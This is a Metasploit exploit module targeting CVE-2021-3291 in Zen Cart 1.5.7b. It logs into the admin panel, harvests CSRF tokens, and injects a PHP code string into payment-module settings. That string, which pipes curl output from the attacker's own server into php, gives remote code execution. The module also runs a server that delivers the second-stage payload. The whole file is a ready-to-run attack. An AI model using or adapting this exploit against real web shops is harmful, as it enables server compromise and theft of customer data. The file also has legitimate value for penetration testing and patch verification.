##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
#
# This exploit  write payload in database and trig to command
# a bug in an zencart v1.5.7b web application
#
###
class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer
  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name'           => 'zencart authenticated remote code execution exploit',
          'Description'    => %q(
              This exploit module execution os command in zencart.
          ),
          'License'        => MSF_LICENSE,
          'Author'         => ['Mucahit Saratar <trregen222@gmail.com>'], # msf module & research & poc
          'References'     =>[
                [ 'OSVDB', '' ],
                [ 'EDB', '' ],
                [ 'URL', 'https://github.com/MucahitSaratar/zencart_auth_rce_poc'],
                [ 'CVE', '2021-3291']
            ],
          'Platform'       => 'php',
          'Privileged'     => false,
          'Arch'           => ARCH_PHP,
          'Targets'        => [ ['Automatic', { }] ],
          'DisclosureDate' => '2021-01-22',
          'DefaultTarget'  => 0
        )
      )
      register_options(
        [
          Opt::RPORT(80),
          OptString.new('USERNAME', [ true, 'User to login with', 'wang']),
          OptString.new('PASSWORD', [ true, 'Password to login with', '1qaz2wsx']),
          OptString.new('BASEPATH', [ true, 'zencart base path eg. /zencart/', '/zencart-1.5.7b/']),
          OptString.new('MODULE', [ true, 'Module name. eg. payment,shipping,ordertotal,plugin_manager', 'payment']),
          OptString.new('SETTING', [ true, 'setting name. eg. freecharger for payment', 'freecharger']),
          OptString.new('TARGETURI', [ true, 'Admin Panel Path', '/Along-olm-shOot/'])
        ], self.class
      )
    end 

    def start_server
        ssltut = false 
        if datastore["SSL"]
            ssltut = true
            datastore["SSL"] = false
        end
        start_service({'Uri' => {
            'Proc' => Proc.new { |cli, req|
              on_request_uri(cli, req)
            },
            'Path' => resource_uri
        }})
        print_status("payload is on #{get_uri}")
        @address = get_uri
        datastore['SSL'] = true if ssltut
    end
    
    def on_request_uri(cli, request)
        print_good('First stage is executed ! Sending 2nd stage of the payload')
        send_response(cli, payload.encoded, {'Content-Type'=>'text/html'})
    end

    def basepath
        datastore["BASEPATH"]
    end

    def username
        datastore["USERNAME"]
    end

    def password
        datastore["PASSWORD"]
    end


    def login
        #"index.php?cmd=login&camefrom=index.php"
        res = send_request_cgi(
        'method'    => 'GET',
        'uri' => normalize_uri(basepath, target_uri.path, "index.php"),
        'vars_get' => {
            'cmd' => 'login',
            'camefrom' => 'index.php'
        })
        # <input type="hidden" name="securityToken" value="c77815040562301dafaef1c84b7aa3f3" />
        unless res
            fail_with(Failure::Unreachable, "Access web application failure")
        end
        if res.code != 200
            fail_with(Failure::Unreachable, "we have #{res.code} response")
        end

        if !res.get_cookies.empty?
            @cookie = res.get_cookies
            @csrftoken = res.body.scan(/<input type="hidden" name="securityToken" value="(.*)" \/>/).flatten[0] || ''
            if @csrftoken.empty?
                fail_with(Failure::Unknown, "#{res.code} - There is no CSRF token at HTTP response.")
            end
            print_good("login Csrf token: "+@csrftoken)
        end

        res = send_request_cgi(
            'method' => 'POST',
            'uri' => normalize_uri(basepath, target_uri.path, "index.php?cmd=login&camefrom=index.php"),
            'cookie' => @cookie,
            'vars_post' => {
                'securityToken' => @csrftoken,
                'action' => "do"+@csrftoken,
                'admin_name' => username,
                'admin_pass' => password
            })
            if res.code != 302
                fail_with(Failure::UnexpectedReply, "#{@csrftoken} - #{@cookie} - #{res.code} - There is no CSRF token at HTTP response.")
            end
            true
        end


    def check
        unless login
            fail_with(Failure::UnexpectedReply, 'Wrong credentials')
            return CheckCode::NotVulnerable('Wrong credentials')
        end
        print_good("Checkpoint 1 - Authenticated successfully and logged in")
        Exploit::CheckCode::Vulnerable
        CheckCode::Vulnerable('Authenticated successfully')

    end

    def exploit
        check
        start_server
        sleep(4)
        res = send_request_cgi(
            'method' => 'GET',
            'uri' => normalize_uri(basepath, target_uri.path, "index.php"),
            'vars_get' => {
                'cmd' => 'modules',
                'set' => datastore["MODULE"],
                'module' => datastore["SETTING"],
                'action' => 'edit'
            },
            'cookie' => @cookie
        )
        if res.code != 200
            fail_with(Failure::UnexpectedReply, 'Something Wrong. code must be 200')
        end
        # <input type="hidden" name="securityToken" value="09068bece11256d03ba55fd2d1f9c820" />
        if res && res.code == 200
            @formtoken = res.body.scan(/<input type="hidden" name="securityToken" value="(.*)" \/>/).flatten[0] || ''
            if @formtoken.empty?
                fail_with(Failure::UnexpectedReply, 'securitytoken not in response')
            end
            @radiobox = res.body.scan(/<input type="radio" name="configuration\[(.*)\]" value="True"/)
            @selector = res.body.scan(/<select rel="dropdown" name="configuration\[(.*)\]" class="form-control">/)
            @textarr = res.body.scan(/<input type="text" name="configuration\[(.*)\]" value="0" class="form-control" \/>/)
            @choose = {}
            @choose["securityToken"] = @formtoken
            for @a in @radiobox
                @choose["configuration[#{@a[0]}]"] = "True','F'); echo `curl #{@address} |php`; //"
            end
            for @a in @selector
                @choose["configuration[#{@a[0]}]"] = "0"
            end
            for @a in @textarr
                @choose["configuration[#{@a[0]}]"] = "0"
            end
            print_good(@choose.to_s)
            res = send_request_cgi(
                'method' => 'POST',
                'uri' => normalize_uri(basepath, target_uri.path, "index.php"),
                'cookie' => @cookie,
                'vars_get' => {
                    'cmd' => 'modules',
                    'set' => datastore["MODULE"],
                    'module' => datastore["SETTING"],
                    'action' => 'save'
                },
                'vars_post' => @choose
            )
	    print_good("Checkpoint 2 - Editing the module")

            res = send_request_cgi(
                'method' => 'GET',
                'uri' => normalize_uri(basepath, target_uri.path, "index.php"),
                'vars_get' => {
                    'cmd' => 'modules',
                    'set' => datastore["MODULE"],
                    'module' => datastore["SETTING"],
                    'action' => 'edit'
                },
                'cookie' => @cookie
            )
            print_good("Checkpoint 3 - The module has been edited")

        end
    end
  end